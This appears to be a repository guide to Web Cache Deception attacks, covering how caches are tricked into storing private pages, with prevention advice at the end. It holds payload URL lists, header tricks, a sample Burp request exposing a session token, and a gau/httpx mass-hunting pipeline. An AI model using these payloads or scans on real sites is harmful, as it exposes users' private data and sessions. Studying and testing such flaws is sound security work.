# Web Cache Deception (WCD) --- Advanced Guide 🚀

## 📖 Introduction

Web Cache Deception (WCD) is a **high-impact vulnerability** where
attackers trick caching mechanisms into storing and serving sensitive
content. This can lead to **unauthorized data access** or even **account
takeover**.

This guide provides **advanced detection and exploitation techniques**
to help security professionals safeguard applications.

------------------------------------------------------------------------

## 📂 Table of Contents

1.  Fundamentals of Web Cache Deception\
2.  How WCD Works & Its Impact\
3.  Cache Keys & Caching Behavior\
4.  Cache Detection & Manual Verification\
5.  Advanced Bypass Techniques & Special Headers\
6.  Encoded Paths & Query Manipulation\
7.  Payloads, Delimiters & URL Tricks\
8.  Exploitation Methodology (Step-by-Step)\
9.  Real-World Attack Examples\
10. Mass Hunting & Automation Commands\
11. Prevention & Mitigation Strategies\
12. Recommended Tools & Practice Labs

------------------------------------------------------------------------

## 🔎 What is Web Cache Deception?

Web Cache Deception occurs when an attacker manipulates a **caching
system (CDN, reverse proxy, browser cache)** into storing **sensitive
content** under a seemingly harmless static resource.

### Simplified Attack Flow:

1.  Website uses CDN or reverse proxy (Cloudflare, Akamai, Fastly) →
    caches static files (`.css`, `.js`, `.jpg`, etc.).

2.  Private pages exist (e.g., `/account`, `/profile`, `/settings`).

3.  Attacker appends fake static extension:

        https://target.com/account/style.css

4.  CDN sees `.css` → assumes **static content** → caches private page
    response.

5.  Any unauthenticated visitor → **receives cached sensitive data**.

### 🎯 Impact:

-   Exposure of personal data
-   Session hijacking
-   Authentication bypass
-   Complete account takeover

------------------------------------------------------------------------

## ⚡ Cache Fundamentals

### 🗝️ Cache Keys

Caches use **keys** to identify resources, usually based on: - Full URL
(with query params) - Selected headers (`Host`, `User-Agent`, etc.) -
Cookies (depending on configuration)

### 🔍 Cache Detection Methods

-   **Tools**: [GiftOfSpeed](https://www.giftofspeed.com/) or Burp Suite
    extensions.
-   **Headers to Watch:**
    -   `X-Cache: HIT` → served from cache
    -   `X-Cache: MISS` → fresh from origin
    -   `X-Cache: dynamic` → not cached
    -   `X-Cache: refresh` → refreshed cache

### 🛠️ Manual Techniques

-   **Request-Response Analysis** → check multiple requests.
-   **Cache Busting** → add `?v=123` & compare.
-   **Timing Analysis** → cached responses are faster.

------------------------------------------------------------------------

## 💥 Exploitation Example

### Burp Request

``` http
GET /account.php/poc.css HTTP/1.1
Host: vulnerable-example.com
User-Agent: Mozilla/5.0
Accept: text/css,*/*;q=0.1
Cache-Control: no-cache
```

### Burp Response

``` http
HTTP/1.1 200 OK
Content-Type: text/css
Cache-Control: public, max-age=86400
X-Cache: HIT

/* Cached sensitive data */
username: johndoe@example.com
email: johndoe@example.com
session_token: 9f73b21d2e934f6e4cbdc8d83c4e9210
```

📌 Result → Sensitive data cached as `.css` & exposed.

------------------------------------------------------------------------

## 📍 Identifying Cacheable Endpoints

Common sensitive endpoints to test:

    /account, /profile, /dashboard, /settings
    /user, /admin, /private, /my-account
    /profile/edit, /user/settings, /admin/panel
    /private/files, /account/info, /dashboard/reports

------------------------------------------------------------------------

## 🎭 File Extensions to Test

Append static-like extensions:

    .css, .js, .svg, .jpg, .json, .xml, .png, .gif, .woff, .pdf, .zip

Example:

    /dashboard.png
    /user.js
    /admin.css
    /orders.jpg

Also try fake dirs:

    /admin.css/login
    /account.js/test
    /settings/fake.js

------------------------------------------------------------------------

## 🧩 Advanced Techniques

### 🔑 Special Headers

``` http
X-Original-URL: /admin/
X-Rewrite-URL: /profile/
X-Forwarded-Host: attacker.com
X-Forwarded-Path: /static.css
```

### 🔐 Encoded Paths

    https://target.com/settings/%2e%2e/images/logo.png
    https://target.com/admin/%2e%2e/scripts/app.js

### 🌀 Query Param Injection

    /account.css?test=123
    /profile.js?test=123

### 🎭 Delimiters & Special Characters

    /account~style.css
    /profile;v2.js
    /admin//panel.css
    /private%00nullbyte.png

### Encoded & Advanced Delimiters

    /account%60.js?test=123
    /profile;.css?test=123
    /dashboard.jpg/*

------------------------------------------------------------------------

## ✅ Simple Exploitation Checklist

1.  Identify sensitive endpoint

2.  Append static extension

3.  Test cache:

    ``` bash
    curl -I https://target.com/account.css
    ```

4.  Look for `X-Cache: HIT`

5.  Verify sensitive content

6.  Try bypass variations

------------------------------------------------------------------------

## 🛠️ Tools

-   [Web Cache Deception Scanner
    (PortSwigger)](https://github.com/PortSwigger/web-cache-deception-scanner)
-   [Burp Suite](https://portswigger.net/burp)
-   [GiftOfSpeed Cache Checker](https://www.giftofspeed.com/)

------------------------------------------------------------------------

## 🎓 Practice Labs

-   [Web Cache Deception --- Web Security
    Academy](https://portswigger.net/web-security/web-cache-deception)

------------------------------------------------------------------------

## 🔍 Mass Hunting & Automation

``` bash
gau target.com | grep -E '/(account|profile|dashboard|settings|user|admin|private|my-account)' > urls.txt
cat urls.txt | while read url; do echo "$url/style.css"; done | httpx-toolkit -mc 200 -title -cl
```

------------------------------------------------------------------------

## 🌍 Real-World Examples

-   **Profile Page Poisoning** → `/user/profile.css` returned sensitive
    user data.
-   **API Endpoint Manipulation** → `/api/user/data?callback=static.js`
    exposed cached JSON.

------------------------------------------------------------------------

## 🛡️ Prevention & Mitigation

✅ **Proper Cache-Control Headers**

``` http
Cache-Control: no-store, no-cache, must-revalidate, private
Pragma: no-cache
```

✅ **Cache Key Config** → tie cache to authentication/session.\
✅ **URL Normalization** → prevent bypass with encoding.\
✅ **Static Resource Segregation** → serve static assets from separate
domains.

------------------------------------------------------------------------

## ✨ Summary

Web Cache Deception is a **powerful yet overlooked attack vector**. By
combining cache misconfigurations with crafted URLs, attackers can
expose highly sensitive data. Proper **security headers, cache rules,
and asset segregation** are essential defenses.

------------------------------------------------------------------------

🔗 **Stay Updated & Contribute** → Fork & Star this repo ⭐
